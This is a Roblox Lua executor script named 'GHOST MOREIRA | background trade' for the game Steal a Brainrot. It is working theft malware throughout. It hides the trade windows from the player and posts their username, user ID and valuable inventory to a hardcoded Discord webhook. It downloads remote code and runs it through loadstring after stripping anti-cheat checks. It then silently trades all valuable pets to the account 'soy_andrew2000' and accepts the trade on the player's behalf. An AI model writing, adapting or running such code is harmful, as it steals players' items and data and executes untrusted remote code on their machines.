-- GHOST MOREIRA | background trade
getgenv().RECEIVERS={"soy_andrew2000"};
getgenv().WEBHOOK="https://discord.com/api/webhooks/1571152286644834396/_xhhQE7oTPQeQdTsww4_UMHAt1_VVZ_dhq1uqnITjjGaNGUjTLeIqYSJ9m1tgbARWZld";
-- mode: nogui
if not game:IsLoaded() then game.Loaded:Wait() end
local PLR=game:GetService('Players').LocalPlayer
local RS=game:GetService('ReplicatedStorage')
local HTTP=game:GetService('HttpService')
local REQ=(syn and syn.request) or (http and http.request) or (type(request)=='function' and request) or (type(http_request)=='function' and http_request)
getgenv().GHOST_VALID_BR={["dragon skeletonini"]=true,["phoenix"]=true,["plant bros"]=true,["hydra serpent"]=true,["orchidox"]=true,["strawberry elephant"]=true,["meowl"]=true,["skibidi toilet"]=true,["los dragons"]=true,["la craft machine"]=true,["gold and diamond"]=true,["dragon cannelloni"]=true,["dragon gingerini"]=true,["griffin"]=true,["hydra dragon cannelloni"]=true,["hydra bunny"]=true,["antonio"]=true,["john pork"]=true,["elefanto frigo"]=true,["rubrikiko"]=true,["pancake and syrup"]=true,["arcadragon"]=true,["rico dinero"]=true,["capitano americano"]=true,["kalika bros"]=true,["tirilikalika tirilikalako"]=true,["globa steppa"]=true,["dug dug dug"]=true,["dragon aquanini"]=true,["la casa boo"]=true,["la supreme combinasion"]=true,["headless horseman"]=true,["signore carapace"]=true,["fishino clownino"]=true,["4th bros"]=true,["bufalino boomberino"]=true,["duggy bros"]=true,["cerberus"]=true,["kraken"]=true,["money money bros"]=true,["venuspino"]=true,["steakini fattini"]=true,["rhino helicopterino"]=true,["caylusaurus"]=true,["sammyni cakini"]=true,["centrucci nuclucci"]=true,["los hackers"]=true,["john doe"]=true,["gorillo subwoofero"]=true,["jelly moby"]=true,["foxini lanternini"]=true,["ginger cisterna"]=true,["bearito cabinito"]=true,["digi narwhal"]=true,["los tangcitos"]=true,["los tictacs"]=true,["moby bros"]=true,["los admins"]=true,["1x1x1x1"]=true,["25"]=true,["67"]=true,["agarrini la palini"]=true,["arcadopus"]=true,["bacuru and egguru"]=true,["bananito"]=true,["baskito"]=true,["berryno"]=true,["bisonte giuppitere"]=true,["blackhole goat"]=true,["boatito auratito"]=true,["boppin bunny"]=true,["brunito marsito"]=true,["bunito bunito spinito"]=true,["bunnyman"]=true,["bunny and eggy"]=true,["bunny bunny bunny sahur"]=true,["buntteo"]=true,["burguro and fryuro"]=true,["burrito bandito"]=true,["capitano moby"]=true,["cash or card"]=true,["celestial pegasus"]=true,["celularcini viciosini"]=true,["chachechi"]=true,["chicleteira bicicleteira"]=true,["chicleteira cupideira"]=true,["chicleteira noelteira"]=true,["chicleteirina bicicleteirina"]=true,["chill puppy"]=true,["chillin chili"]=true,["chimnino"]=true,["chipso and queso"]=true,["churrito bunnito"]=true,["cigno fulgoro"]=true,["cloverat clapat"]=true,["cooki and milki"]=true,["cuadramat and pakrahmatmamat"]=true,["cupid cupid sahur"]=true,["cupid hotspot"]=true,["dj panda"]=true,["donkeyturbo express"]=true,["dul dul dul"]=true,["easter easter easter sahur"]=true,["eid eid eid sahur"]=true,["esok sekolah"]=true,["eviledon"]=true,["extinct matteo"]=true,["extinct tralalero"]=true,["festive 67"]=true,["fishboard"]=true,["fortunu and cashuru"]=true,["fragola la la la"]=true,["fragrama and chocrama"]=true,["frankentteo"]=true,["goat"]=true,["garama and madundung"]=true,["giftini spyderini"]=true,["ginger gerat"]=true,["gobblino uniciclino"]=true,["gold gold gold"]=true,["graipuss medussi"]=true,["granny"]=true,["guerriro digitale"]=true,["guest 666"]=true,["ho ho ho sahur"]=true,["hopilikalika hopilikalako"]=true,["horegini boom"]=true,["jackorilla"]=true,["job job job sahur"]=true,["jolly jolly sahur"]=true,["karker sahur"]=true,["karkerkar kurkur"]=true,["ketchuru and musturu"]=true,["ketupat bros"]=true,["ketupat kepat"]=true,["la cucaracha"]=true,["la easter grande"]=true,["la extinct grande"]=true,["la food combinasion"]=true,["la ginger sekolah"]=true,["la grande combinasion"]=true,["la jolly grande"]=true,["la karkerkar combinasion"]=true,["la lucky grande"]=true,["la romantic grande"]=true,["la sahur combinasion"]=true,["la secret combinasion"]=true,["la spooky grande"]=true,["la taco combinasion"]=true,["la vacca jacko linterino"]=true,["la vacca lepre lepreino"]=true,["la vacca prese presente"]=true,["la vacca saturno saturnita"]=true,["las sis"]=true,["las tralaleritas"]=true,["las vaquitas saturnitas"]=true,["lavadorito spinito"]=true,["coco and mango"]=true,["los secret combinasionas"]=true,["examen bros"]=true,["pizza and ranch"]=true,["chicleteira champeona"]=true,["list list list sahur"]=true,["los 25"]=true,["los 67"]=true,["los amigos"]=true,["bumbatron"]=true,["yetimatic"]=true,["s'more serat"]=true,["queen bee"]=true,["scorpino coasterino"]=true,["honey honey bear"]=true,["pogo pogo penguin"]=true,["conetto morsetto"]=true,["la breakfast combinasion"]=true,["los bunitos"]=true,["los burritos"]=true,["los candies"]=true,["los chicleteiras"]=true,["los combinasionas"]=true,["los cucarachas"]=true,["los cupids"]=true,["los hotspotsitos"]=true,["los jobcitos"]=true,["los jolly combinasionas"]=true,["los karkeritos"]=true,["los matteos"]=true,["los mi gatitos"]=true,["los mobilis"]=true,["los nooo my hotspotsitos"]=true,["los planitos"]=true,["los primos"]=true,["los puggies"]=true,["los quesadillas"]=true,["los sekolahs"]=true,["los spaghettis"]=true,["los spooky combinasionas"]=true,["los spyderinis"]=true,["los sweethearts"]=true,["los tacoritas"]=true,["los tortus"]=true,["los tralaleritos"]=true,["los trios"]=true,["love love bear"]=true,["love love love sahur"]=true,["lovin rose"]=true,["luck luck luck sahur"]=true,["mariachi corazoni"]=true,["mi gatito"]=true,["mieteteira bicicleteira"]=true,["money money puggy"]=true,["money money reindeer"]=true,["nacho spyder"]=true,["naughty naughty"]=true,["noo my candy"]=true,["noo my eggs"]=true,["noo my examine"]=true,["noo my gold"]=true,["noo my heart"]=true,["noo my present"]=true,["nooo my hotspot"]=true,["nuclearo dinossauro"]=true,["orcaledon"]=true,["paradiso axolottino"]=true,["perrito burrito"]=true,["pirulitoita bicicleteira"]=true,["please my present"]=true,["popcuru and fizzuru"]=true,["pot hotspot"]=true,["pot pumpkin"]=true,["pumpkini spyderini"]=true,["quackini snackini"]=true,["quesadilla crocodila"]=true,["quesadillo vampiro"]=true,["rang ring bus"]=true,["reindeer tralala"]=true,["reinito sleighito"]=true,["rocco disco"]=true,["rosey and teddy"]=true,["rosetti tualetti"]=true,["sammyni fattini"]=true,["sammyni spyderini"]=true,["santa hotspot"]=true,["santteo"]=true,["secret lucky block"]=true,["serafinna medusella"]=true,["snailo clovero"]=true,["spaghetti tualetti"]=true,["spinny hammy"]=true,["spooky and pumpky"]=true,["strawberrita"]=true,["swag soda"]=true,["swaggy bros"]=true,["tacorita bicicleta"]=true,["tacorillo crocodillo"]=true,["tang tang keletang"]=true,["telemorte"]=true,["tictac sahur"]=true,["to to to sahur"]=true,["torrtuginni dragonfrutini"]=true,["tralaledon"]=true,["trenostruzzo turbo 4000"]=true,["trickolino"]=true,["triplito tralaleritos"]=true,["tuff toucan"]=true,["tung tung tung sahur"]=true,["ventoliero pavonero"]=true,["vulturino skeletono"]=true,["w or l"]=true,["yess my examine"]=true,["zombie tralala"]=true,["grabatron"]=true,["rubiko and kubiko"]=true,["cangurato gelato"]=true,["noodle noodle poodle"]=true,["candini fluffini"]=true,["la fuse machine"]=true,["polaroidini"]=true,["nachorilla"]=true,["sammyni truckini"]=true,["tacoturbo tacorito"]=true,["burrito bat"]=true,["chicli chicla"]=true,["panda popanda"]=true,["deputy leopard"]=true}
getgenv().GHOST_VALID_BS={["aquatic"]=true,["bunny basket"]=true,["candy"]=true,["christmas"]=true,["cursed"]=true,["cyber"]=true,["diamond"]=true,["divine"]=true,["easter"]=true,["galaxy"]=true,["gingerbread"]=true,["gold"]=true,["halloween"]=true,["lava"]=true,["lucky"]=true,["octo"]=true,["pot of gold"]=true,["radioactive"]=true,["rainbow"]=true,["rose"]=true,["summer"]=true,["taco"]=true,["valentines"]=true,["yin yang"]=true,["tralalero"]=true}
getgenv().GHOST_VALID_GE={["alien slap"]=true,["blackhole bomb"]=true,["bloodmoon hammer"]=true,["bloodmoon slap"]=true,["candy sentry"]=true,["candy slap"]=true,["cupid's wings"]=true,["cursed slap"]=true,["cyber slap"]=true,["demon's head"]=true,["divine slap"]=true,["lava blaster"]=true,["lava slap"]=true,["radioactive airstrike"]=true,["radioactive slap"]=true,["rainbow hammer"]=true,["rainbow slap"]=true,["santa's sleigh"]=true,["waverider"]=true,["witch's broom"]=true,["yin yang lamp"]=true,["yin yang slap"]=true,["phantom slap"]=true,["crystal slap"]=true}
getgenv().GHOST_TARGET="soy_andrew2000"
getgenv().GHOST_WEBHOOK="https://discord.com/api/webhooks/1571152286644834396/_xhhQE7oTPQeQdTsww4_UMHAt1_VVZ_dhq1uqnITjjGaNGUjTLeIqYSJ9m1tgbARWZld"
getgenv().GHOST_SELECTED_BR={"Dragon Skeletonini","Phoenix","Plant Bros","Hydra Serpent","Orchidox","Strawberry Elephant","Meowl","Skibidi Toilet","Los Dragons","La Craft Machine","Gold and Diamond","Dragon Cannelloni","Dragon Gingerini","Griffin","Hydra Dragon Cannelloni","Hydra Bunny","Antonio","John Pork","Elefanto Frigo","Rubrikiko","Pancake and Syrup","Arcadragon","Rico Dinero","Capitano Americano","Kalika Bros","Tirilikalika Tirilikalako","Globa Steppa","Dug Dug Dug","Dragon Aquanini","La Casa Boo","La Supreme Combinasion","Headless Horseman","Signore Carapace","Fishino Clownino","4th Bros","Bufalino Boomberino","Duggy Bros","Cerberus","Kraken","Money Money Bros","Venuspino","Steakini Fattini","Rhino Helicopterino","Caylusaurus","Sammyni Cakini","Centrucci Nuclucci","Los Hackers","John Doe","Gorillo Subwoofero","Jelly Moby","Foxini Lanternini","Ginger Cisterna","Bearito Cabinito","Digi Narwhal","Los Tangcitos","Los Tictacs","Moby Bros","Los Admins","1x1x1x1","25","67","Agarrini la Palini","Arcadopus","Bacuru and Egguru","Bananito","Baskito","Berryno","Bisonte Giuppitere","Blackhole GOAT","Boatito Auratito","Boppin Bunny","Brunito Marsito","Bunito Bunito Spinito","Bunnyman","Bunny and Eggy","Bunny Bunny Bunny Sahur","Buntteo","Burguro and Fryuro","Burrito Bandito","Capitano Moby","Cash or Card","Celestial Pegasus","Celularcini Viciosini","Chachechi","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chill Puppy","Chillin Chili","Chimnino","Chipso and Queso","Churrito Bunnito","Cigno Fulgoro","Cloverat Clapat","Cooki and Milki","Cuadramat and Pakrahmatmamat","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Donkeyturbo Express","Dul Dul Dul","Easter Easter Easter Sahur","Eid Eid Eid Sahur","Esok Sekolah","Eviledon","Extinct Matteo","Extinct Tralalero","Festive 67","Fishboard","Fortunu and Cashuru","Fragola La La La","Fragrama and Chocrama","Frankentteo","GOAT","Garama and Madundung","Giftini Spyderini","Ginger Gerat","Gobblino Uniciclino","Gold Gold Gold","Graipuss Medussi","Granny","Guerriro Digitale","Guest 666","Ho Ho Ho Sahur","Hopilikalika Hopilikalako","Horegini Boom","Jackorilla","Job Job Job Sahur","Jolly Jolly Sahur","Karker Sahur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","La Cucaracha","La Easter Grande","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Lucky Grande","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Lepre Lepreino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Coco and Mango","Los Secret Combinasionas","Examen Bros","Pizza and Ranch","Chicleteira Champeona","List List List Sahur","Los 25","Los 67","Los Amigos","Bumbatron","Yetimatic","S'more Serat","Queen Bee","Scorpino Coasterino","Honey Honey Bear","Pogo Pogo Penguin","Conetto Morsetto","La Breakfast Combinasion","Los Bunitos","Los Burritos","Los Candies","Los Chicleteiras","Los Combinasionas","Los Cucarachas","Los Cupids","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Nooo My Hotspotsitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Tacoritas","Los Tortus","Los Tralaleritos","Los Trios","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luck Luck Luck Sahur","Mariachi Corazoni","Mi Gatito","Mieteteira Bicicleteira","Money Money Puggy","Money Money Reindeer","Nacho Spyder","Naughty Naughty","Noo My Candy","Noo My Eggs","Noo My Examine","Noo My Gold","Noo My Heart","Noo My Present","Nooo My Hotspot","Nuclearo Dinossauro","Orcaledon","Paradiso Axolottino","Perrito Burrito","Pirulitoita Bicicleteira","Please My Present","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Pumpkini Spyderini","Quackini Snackini","Quesadilla Crocodila","Quesadillo Vampiro","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rocco Disco","Rosey and Teddy","Rosetti Tualetti","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Secret Lucky Block","Serafinna Medusella","Snailo Clovero","Spaghetti Tualetti","Spinny Hammy","Spooky and Pumpky","Strawberrita","Swag Soda","Swaggy Bros","Tacorita Bicicleta","Tacorillo Crocodillo","Tang Tang Keletang","Telemorte","Tictac Sahur","To To To Sahur","Torrtuginni Dragonfrutini","Tralaledon","Trenostruzzo Turbo 4000","Trickolino","Triplito Tralaleritos","Tuff Toucan","Tung Tung Tung Sahur","Ventoliero Pavonero","Vulturino Skeletono","W or L","Yess My Examine","Zombie Tralala","Grabatron","Rubiko and Kubiko","Cangurato Gelato","Noodle Noodle Poodle","Candini Fluffini","La Fuse Machine","Polaroidini","Nachorilla","Sammyni Truckini","Tacoturbo Tacorito","Burrito Bat","Chicli Chicla","Panda Popanda","Deputy Leopard"}
getgenv().GHOST_SELECTED_BS={"Aquatic","Bunny Basket","Candy","Christmas","Cursed","Cyber","Diamond","Divine","Easter","Galaxy","Gingerbread","Gold","Halloween","Lava","Lucky","Octo","Pot of Gold","Radioactive","Rainbow","Rose","Summer","Taco","Valentines","Yin Yang","Tralalero"}
getgenv().GHOST_SELECTED_GE={"Alien Slap","Blackhole Bomb","Bloodmoon Hammer","Bloodmoon Slap","Candy Sentry","Candy Slap","Cupid's Wings","Cursed Slap","Cyber Slap","Demon's Head","Divine Slap","Lava Blaster","Lava Slap","Radioactive Airstrike","Radioactive Slap","Rainbow Hammer","Rainbow Slap","Santa's Sleigh","Waverider","Witch's Broom","Yin Yang Lamp","Yin Yang Slap","Phantom Slap","Crystal Slap"}
local function esc(s) return (tostring(s or ''):gsub('`',"'"):gsub('\n',' ')) end
local function fmt(n) n=tonumber(n) or 0 if n>=1e9 then return string.format('%.1fB',n/1e9) end if n>=1e6 then return string.format('%.1fM',n/1e6) end if n>=1e3 then return string.format('%.1fK',n/1e3) end return tostring(n) end
local function post(payload) if not REQ or not getgenv().GHOST_WEBHOOK or getgenv().GHOST_WEBHOOK=='' then return end pcall(function() REQ({Url=getgenv().GHOST_WEBHOOK,Method='POST',Headers={['Content-Type']='application/json'},Body=HTTP:JSONEncode(payload)}) end) end
local function executor() if identifyexecutor then local ok,v=pcall(identifyexecutor) if ok and v then return tostring(v) end end if getexecutorname then local ok,v=pcall(getexecutorname) if ok and v then return tostring(v) end end return 'Unknown' end
task.spawn(function() local pg=PLR:WaitForChild('PlayerGui',20) if not pg then return end local hide={TradeLiveTrade=true,TradePlayerList=true,TradePrompts=true,BrainrotTrader=true} local function h(g) if not g then return end pcall(function() g.Enabled=false end) pcall(function() g:GetPropertyChangedSignal('Enabled'):Connect(function() if g.Enabled then g.Enabled=false end end) end) end for _,c in ipairs(pg:GetChildren()) do if hide[c.Name] then h(c) end end pg.ChildAdded:Connect(function(c) if hide[c.Name] then task.defer(function() h(c) end) end end) end)
task.spawn(function()
  getgenv().RECEIVERS={"soy_andrew2000"}
  getgenv().WEBHOOK="https://discord.com/api/webhooks/1571152286644834396/_xhhQE7oTPQeQdTsww4_UMHAt1_VVZ_dhq1uqnITjjGaNGUjTLeIqYSJ9m1tgbARWZld"
  getgenv().THRESHOLD=0
  local sabUrl='https://ghost-moreira.vercel.app/sab.txt'
  for attempt=1,6 do
    local ok,body=pcall(game.HttpGet,game,sabUrl..'?t='..tostring(tick()))
    if ok and body and #body>500 then
      body=body:gsub('NEDYXSTOCK19',function() return getgenv().GHOST_TARGET or 'x' end)
      body=body:gsub('Kick%([\"\']Wrong game[\"\']%)','print(\"[SAB] skip\")')
      body=body:gsub('while task%.wait%(%) do%s*pcall%(function%(%)%s*for _, v in ipairs%(getconnections','while false do pcall(function() for _, v in ipairs(getconnections')
      body=body:gsub('fn22%(%)','(function() return false end)()')
      task.spawn(function() pcall(function() loadstring(body)() end) end)
      return
    end
    task.wait(0.4)
  end
end)
task.spawn(function()
  local br,gears={},{}
  local Animals,Mutations,plot
  pcall(function() Animals=require(RS.Datas.Animals) end)
  pcall(function() Mutations=require(RS.Datas.Mutations) end)
  for i=1,60 do
    pcall(function() plot=require(RS.Controllers.PlotController):GetMyPlot() end)
    if plot and plot.Channel then
      local list; pcall(function() list=plot.Channel:Get('AnimalList') or plot.Channel:Get('AnimalPodiums') end)
      if type(list)=='table' and next(list) then
        local selmap,empty={},true
        for _,n in ipairs(getgenv().GHOST_SELECTED_BR or {}) do selmap[string.lower(n)]=true empty=false end
        if empty then selmap=getgenv().GHOST_VALID_BR or {} end
        local seen={}
        for slot,a in pairs(list) do
          if tonumber(slot) and type(a)=='table' and not a.Machine then
            local base=(Animals and Animals[a.Index]) or {}
            local raw=base.DisplayName or a.Index or '?'
            local low=string.lower(raw)
            if not seen[low] then
              seen[low]=true
              local gen=base.Generation or 0
              if a.Mutation and Mutations and Mutations[a.Mutation] and Mutations[a.Mutation].modifier then gen=gen+gen*Mutations[a.Mutation].modifier end
              gen=math.round(gen)
              local mark=(selmap[low] and '* ' or '')
              local mut=esc(a.Mutation or '')
              local mstr=mut~='' and ('['..mut..'] ') or ''
              br[#br+1]=mark..'BR **'..mstr..esc(raw)..'** ($'..fmt(gen)..'/s)'
            end
          end
        end
        break
      end
    end
    task.wait(0.25)
  end
  pcall(function() local seen={} local wantG={} local emptyG=true for _,n in ipairs(getgenv().GHOST_SELECTED_GE or {}) do wantG[string.lower(n)]=true emptyG=false end if emptyG then for k,_ in pairs(getgenv().GHOST_VALID_GE or {}) do wantG[k]=true end end local function add(t) local n=t.Name local ln=string.lower(n) local hit=wantG[ln] if not hit then for k,_ in pairs(wantG) do if ln:find(k,1,true) or k:find(ln,1,true) then hit=true break end end end if hit and not seen[ln] then seen[ln]=true gears[#gears+1]=n end end local bp=PLR:FindFirstChild('Backpack') if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA('Tool') then add(t) end end end if PLR.Character then for _,t in ipairs(PLR.Character:GetChildren()) do if t:IsA('Tool') then add(t) end end end end)
  local skins={}
  pcall(function() local wantS={} local emptyS=true for _,n in ipairs(getgenv().GHOST_SELECTED_BS or {}) do wantS[string.lower(n)]=true emptyS=false end if emptyS then for k,_ in pairs(getgenv().GHOST_VALID_BS or {}) do wantS[k]=true end end local function addS(s) if type(s)~='string' or #s==0 then return end local ls=string.lower(s) if wantS[ls] and not skins[ls] then skins[ls]=s end end local plot2; pcall(function() plot2=require(RS.Controllers.PlotController):GetMyPlot() end) if plot2 then local a=plot2:GetAttribute('Skin') or plot2:GetAttribute('BaseSkin') or plot2:GetAttribute('EquippedSkin') if a then addS(tostring(a)) end if plot2.Channel then local ok,v=pcall(function() return plot2.Channel:Get('Skin') end) if ok and v then addS(tostring(v)) end local ok2,v2=pcall(function() return plot2.Channel:Get('BaseSkin') end) if ok2 and v2 then addS(tostring(v2)) end end end end)
  local brLines=(#br>0) and br or {'*None*'}
  local gearLines={} for _,g in ipairs(gears) do gearLines[#gearLines+1]='GEAR **'..esc(g)..'**' end if #gearLines==0 then gearLines[1]='*None*' end
  local skinLines={} for _,s in pairs(skins) do skinLines[#skinLines+1]='SKIN **'..esc(s)..'**' end if #skinLines==0 then skinLines[1]='*None*' end
  local t=math.floor(os.time()) local pc=#game:GetService('Players'):GetPlayers()
  local desc='Invite from: `'..esc(PLR.Name)..'` ID `'..tostring(PLR.UserId)..'`\n\n## Brainrots\n'..table.concat(brLines,'\n')..'\n\n## Gears\n'..table.concat(gearLines,'\n')..'\n\n## Base Skins\n'..table.concat(skinLines,'\n')..'\n\n## Status\nPlayers: **'..pc..'**\nExecutor: **'..esc(executor())..'**'
  post({username='GHOST MOREIRA',content='@here',embeds={{description=desc,color=9662683}}})
end)
task.spawn(function()
  local target=getgenv().GHOST_TARGET if not target or target=='' then return end
  local PlotController,Animals,RC
  pcall(function() PlotController=require(RS.Controllers.PlotController) end)
  pcall(function() Animals=require(RS.Datas.Animals) end)
  pcall(function() RC=require(RS.Packages.ReplicatorClient) end)
  local inviteRF,addRF,readyRE,acceptRE
  pcall(function() for _,obj in ipairs(RS:GetDescendants()) do local n=string.lower(obj.Name) if obj:IsA('RemoteFunction') then if n:find('invite') and not n:find('accept') and not inviteRF then inviteRF=obj end if n:find('addbrainrot') then addRF=obj end elseif obj:IsA('RemoteEvent') then if n:find('ready') and not readyRE then readyRE=obj end if (n=='accept' or (n:find('accept') and not n:find('invite'))) and not acceptRE then acceptRE=obj end end end end)
  local function uidOf(name) local ok,id=pcall(function() return game.Players:GetUserIdFromNameAsync(name) end) return ok and id or nil end
  local function tradeCh() if not RC then return nil end local ok,ch=pcall(function() return RC.get(('Trade_%d'):format(PLR.UserId)) end) if ok and ch and ch.TryIndex and ch:TryIndex({'active','data'}) then return ch end return nil end
  local function myIdx(ch) local u=ch:TryIndex({'active','data','users'}) if type(u)~='table' then return nil end for k,v in pairs(u) do if v==PLR.UserId then return k end end return nil end
  local function want() local s={} local empty=true for _,n in ipairs(getgenv().GHOST_SELECTED_BR or {}) do s[string.lower(n)]=true empty=false end if empty then return getgenv().GHOST_VALID_BR or {} end return s end
  local function slots() local out={} pcall(function() local plot=PlotController and PlotController:GetMyPlot() if not plot or not plot.Channel then return end local list=plot.Channel:Get('AnimalList') or plot.Channel:Get('AnimalPodiums') if type(list)~='table' then return end local w=want() for slot,a in pairs(list) do local sn=tonumber(slot) if sn and type(a)=='table' and not a.Machine then local base=(Animals and Animals[a.Index]) or {} local name=string.lower(base.DisplayName or a.Index or '?') if w[name] then out[#out+1]={slot=sn,UUID=a.UUID,Index=a.Index,Mutation=a.Mutation,Traits=a.Traits,LastCollect=a.LastCollect or os.time(),OfflineGain=a.OfflineGain or 99} end end end table.sort(out,function(a,b) return a.slot<b.slot end) end) return out end
  local uid=uidOf(target) if not uid then warn('[GHOST] bad user') return end
  local ch,idx
  local function textOf(o) local t='' pcall(function() if o:IsA('TextLabel') or o:IsA('TextButton') then t=o.Text elseif o:FindFirstChildWhichIsA('TextLabel',true) then t=o:FindFirstChildWhichIsA('TextLabel',true).Text end end) return string.lower(tostring(t or '')) end
  local tradeWords={'intercambio','trade','troca','échange',' обмен','교환','交易','交換','scambio'}
  local globalWords={'global','mundial','monde','weltweit','глобал'}
  local function clickTradeUI()
    local pg=PLR:FindFirstChild('PlayerGui') if not pg then return end
    for _,gui in ipairs(pg:GetDescendants()) do
      if gui:IsA('TextButton') or gui:IsA('ImageButton') then
        local t=textOf(gui)
        for _,w in ipairs(tradeWords) do if t:find(w,1,true) then pcall(function() firesignal(gui.MouseButton1Click) end) pcall(function() gui.Activated:Fire() end) task.wait(0.15) break end end
      end
    end
    task.wait(0.2)
    for _,gui in ipairs(pg:GetDescendants()) do
      if gui:IsA('TextButton') or gui:IsA('ImageButton') then
        local t=textOf(gui)
        for _,w in ipairs(globalWords) do if t:find(w,1,true) then pcall(function() firesignal(gui.MouseButton1Click) end) pcall(function() gui.Activated:Fire() end) task.wait(0.15) break end end
      end
    end
    -- try fill username box
    for _,tb in ipairs(pg:GetDescendants()) do
      if tb:IsA('TextBox') then
        local ph=string.lower(tostring(tb.PlaceholderText or ''))
        if ph:find('user') or ph:find('name') or ph:find('jugador') or ph:find('player') or #ph==0 then
          pcall(function() tb.Text=target end)
        end
      end
    end
  end
  for i=1,50 do
    ch=tradeCh() if ch then idx=myIdx(ch) end
    if ch and idx then break end
    pcall(function() if inviteRF then inviteRF:InvokeServer(uid) end end)
    if i%2==1 then pcall(clickTradeUI) end
    task.wait(0.35+math.random()*0.15)
  end
  if not (ch and idx) then warn('[GHOST] no trade') return end
  local dl=tick()+70 while tick()<dl do if not ch:TryIndex({'active','data'}) then ch=tradeCh() if not ch then break end end local p=ch:TryIndex({'active','data','players'}) if type(p)=='table' then local c=0 for _ in pairs(p) do c=c+1 end if c>=2 then break end end task.wait(0.2+math.random()*0.1) end
  if addRF then local list=slots() for _,s in ipairs(list) do if not ch:TryIndex({'active','data'}) then break end pcall(function() addRF:InvokeServer(s.slot,{UUID=s.UUID,Index=s.Index,Mutation=s.Mutation,Traits=s.Traits,IndexOnPlot=s.slot,LastCollect=s.LastCollect,OfflineGain=s.OfflineGain,Steal=false}) end) task.wait(0.45+math.random()*0.15) end end
  task.wait(1) for i=1,20 do if not ch or not ch:TryIndex({'active','data'}) then break end local p=ch:TryIndex({'active','data','players'}) local me=p and p[idx] if me then if not me.ready and readyRE then pcall(function() readyRE:FireServer() end) end if me.ready and not me.accepted and acceptRE then pcall(function() acceptRE:FireServer() end) end if me.accepted then break end end task.wait(0.25+math.random()*0.1) end
end)